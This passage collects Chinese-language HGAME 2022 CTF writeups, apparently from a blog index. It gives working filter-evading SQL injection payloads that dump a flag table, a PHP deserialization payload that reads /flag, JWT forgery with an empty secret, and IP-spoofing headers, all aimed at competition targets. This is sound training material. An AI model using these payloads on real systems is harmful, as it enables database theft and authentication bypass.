再看一下这个表里有什么字段\n\n1&#x2F;*h*&#x2F;UNIunionON&#x2F;*h*&#x2F;SEselectLECT&#x2F;*h*&#x2F;1,group_concat(column_name)&#x2F;*h*&#x2F;FRfromOM&#x2F;*h*&#x2F;infoORrmation_schema.columns&#x2F;*h*&#x2F;WHEwhereRE&#x2F;*h*&#x2F;table_name&#x2F;*h*&#x2F;LIKE&#x2F;*h*&#x2F;&#39;fllllllllaaaaaag&#39;&#x2F;*h*&#x2F;ANandD&#x2F;*h*&#x2F;table_schema&#x2F;*h*&#x2F;LIKE&#x2F;*h*&#x2F;&#39;pokemon&#39;;#\n\n#发现该表里存在名为flag的字段\n#查看flag\n\n1&#x2F;*h*&#x2F;UNIunionON&#x2F;*h*&#x2F;SELselectECT&#x2F;*h*&#x2F;1,flag&#x2F;*h*&#x2F;FRfromOM&#x2F;*h*&#x2F;fllllllllaaaaaag;#\n\n# 拿到 \n\n\n一本单词书常规F12打开发现hint\n\n下载附件得到网站源码\n\n可以找到登录用户名为:adm1n,密码可使用数字加字母的方式绕过，即password可以填上:1080a\n输入用户名和密码进去\n这个页面为index.php\n\n继续审一审附件中的代码发现存在反序列化漏洞\n同时发现flag在   /flag\n表单传进去的数据以key:value的形式保存进行处理，在encode()中key不会被序列化value会进行序列化并且原key和序列化后的value会以**|**进行分隔\n关键是这个encode()函数和decode()函数\nfunction encode($data): string &#123;\n    $result = '';\n    foreach ($data as $k => $v) &#123;\n        $result .= $k . '|' . serialize($v);\n    &#125;\n\n    return $result;\n&#125;\n\nfunction decode(string $data): Array &#123;\n    $result = [];\n    $offset = 0;\n    $length = \\strlen($data);\n    while ($offset &lt; $length) &#123;\n        if (!strstr(substr($data, $offset), '|')) &#123;\n            return [];\n        &#125;\n        $pos = strpos($data, '|', $offset);\n        $num = $pos - $offset;\n        $varname = substr($data, $offset, $num);\n        $offset += $num + 1;\n        $dataItem = unserialize(substr($data, $offset));\n\n        $result[$varname] = $dataItem;\n        $offset += \\strlen(serialize($dataItem));\n    &#125;\n    return $result;\n&#125;\n\n在decode时会以 | 来区分key和序列化后的value（key未被序列化）\n再看Evil.php，其可以输出flag，只需将这个file覆盖为/flag即可\n&lt;?php\n\nclass Evil &#123;\n    public $file;\n    public $flag;\n\n    public function __wakeup() &#123;\n        $content = file_get_contents($this->file);\n        if (preg_match(\"/hgame/\", $content)) &#123;\n            $this->flag = 'hacker!';\n        &#125;\n        $this->flag = $content;\n    &#125;\n&#125;\n\n\n\n\n既然key不会被encode，那可以在key这个地方传入序列化后的Evil类对象，然后再decode这个key，得到Evil对象，之后自动调用__wakeup()这个函数，拿到flag。那么要让key在decode()函数中反序列化可在最前面加上一个  |  进行绕过，这样就可以把这个key当作value来处理，则可以构造payload\n|O:4:&quot;Evil&quot;:2:&#123;s:4:&quot;file&quot;;s:5:&quot;&#x2F;flag&quot;;s:4:&quot;flag&quot;;N;&#125;\n\n输入到 “单词框”\n\n拿到flag\n\nmisc奇妙小游戏nc连接\n\n首先要完成这个，直接使用pwntools这个库写脚本\nimport hashlib\nfrom string import ascii_letters, digits\nfrom pwn import *\nfrom itertools import product\ntable = ascii_letters + digits\nclass Solve():\n    def __init__(self):\n        self.sh = remote('chuj.top', 51003)\n    def proof_of_work(self):\n        proof = self.sh.recvuntil(b'input your ????> ').decode()\n        # print(proof)\n        find_index = proof.find('????')\n        tail = proof[find_index:find_index + 4]\n        _hash = proof[find_index + 9:proof.find('\\ninput')]\n        # print(_hash)\n        for i in product(table, repeat=4):\n            t = hashlib.sha256((''.join(i)).encode()).hexdigest()\n            if t == _hash:\n                self.sh.sendline(''.join(i).encode())\n                print(''.join(i))\n                # print(t)\n                break\n\n    def solve(self):\n        self.proof_of_work()\n        self.sh.interactive()\n\nif __name__ == '__main__':\n    solution = Solve()\n    solution.solve()\n\n运行得到\n\n要玩这个小游戏，鬼脚图，玩通过就能拿到flag了\n\n","categories":["CTF-WP"],"tags":["CTF","HGAME"]},{"title":"HGAME 2022 Week1 writeup by pankas","url":"/2022/01/27/week1-pankas/","content":"webeasy_auth​    先看一下题目，有提示\n​    尊贵的admin写了个todo帮助自己管理日常，但他好像没调试完就部署了….一个月后，当他再一次打开他的小网站，似乎忘记了密码…他的todo之前记录了很重要的东西，快帮帮他不要爆破！\n这里目标网站时在开发中的，flag应该在admin用户里。\n\n打开发现输入admin密码随便写一个，结果不对，那注册一个看看\n注册号登录进去\n\n看了下这个页面也没什么，抓一下包发现token\n\n这个token是JWT，网上搜索一下进能知道只要找到了JWT的secret就可以伪造token发送到服务器通过验证了\n由于题目说是还在调试当中， 猜测secret为空，试一试。\n到jwt.io这个网站里\n\n将UserName改为admin，ID改为1(最贵的admin开发者肯定是网站注册的第一个人)，下面的secret为空，\n将修改后的token发送\n\n拿到flag\n\n这里简单说一下原理\n验证方法：首先服务端会产生一个secret，然后以这个secret作为密钥，使用第一部分选择的加密方式（这里就是HS256），对第一部分和第二部分拼接的结果进行加密，然后把加密结果放到第三部分。因为加密算法我们已经知道了，如果我们只要再得到加密的secret，我们就能伪造数据，并且通过服务器的检查。\nTetris plus提示说要玩够3000分，不可能的。像这类浏览器小游戏那肯定是先查看js源码。\n\n结果在这个checking.js文件里发现了jsfuck代码，jsfuck可以直接放到控制台运行，试试看。\n\n放到控制台运行拿到flag。\nFujiwara Tofu Shop秋名山飙车啊，进去看一看。\n\n提示说首先要到qiumingshan.net这个地方去，那么在web中的意思就是要让你的referer为qiumingshan.net\n用HackBar添加请求头referer\n\nExecute后又出现\n\n通行证啊，那么修改一下User-Agent为Hachi-Roku即可\n\n继续得到\n\n要求其cookie的味道是Raspberry，那么在Cookies上添加上flavor=Raspberry\n\n之后…..还有，要求加油到100，查看请求头可以看到当前Gasoline为0\n\n那么在请求头里添加上Gasoline: 100即可\n\n之后又要求其请求从本地发出来\n\n那可以使用伪造请求IP的方法，又如下几种\nX-Forwarded-For:\nX-Forwarded-Host:\nX-Client-IP:\nX-remote-IP:\nX-remote-addr:\nTrue-Client-IP:\nClient-IP:\nX-Real-IP:\n\n全都试一遍发现只有X-Real-IP没有被ban，伪造IP为本地127.0.0.1\n\n执行后成功拿到flag\n\n蛛蛛…嘿嘿♥我的蛛蛛这题也是个小游戏，这个按钮也是越点越多，而且只有一个是真的。先玩几关看一下它响应的内容，很有规律。\n每次都会在原url基础上拼接一个?key=##########。那直接交给爬虫。\n\n不废话，上代码。\nimport requests\nimport time\ndef run(url):\n    newUrl = url\n    while True:\n        response = requests.get(newUrl)\n        print(response.text[response.text.find('&lt;h1>')+4:response.text.find('&lt;/h1>')])\n        index = response.text.find('?key')# 没有找到find返回-1\n        if index == -1:\n            print(newUrl)\n            exit(0)\n        text = response.text[index:]\n        newUrl = url + text[:text.find('\">')]\n        time.sleep(0.5)\nif __name__ == '__main__':\n    run('https://hgame-spider.vidar.club/90bc5cb81b')\n\n\n发现在100关后面，点开爬到的url\n\n在请求头里发现flag\nMisc好康的流量下载附件拿到一份截获的流量，用wireshark打开用导出为邮件\n\n拿到涩图\n\n这个图片试了很多方法，最后发现使用stegsolver打开发现一个条形码。\n\n扫码拿到一半的flag。\n还有一半应该是lsb隐藏的。\n\n使用工具拿到另一半。（这里其实是试出来的）\n饭卡的uno下载附件使用 010editor打开就是flag\n\n","categories":["CTF-WP"],"tags":["CTF","HGAME"]}]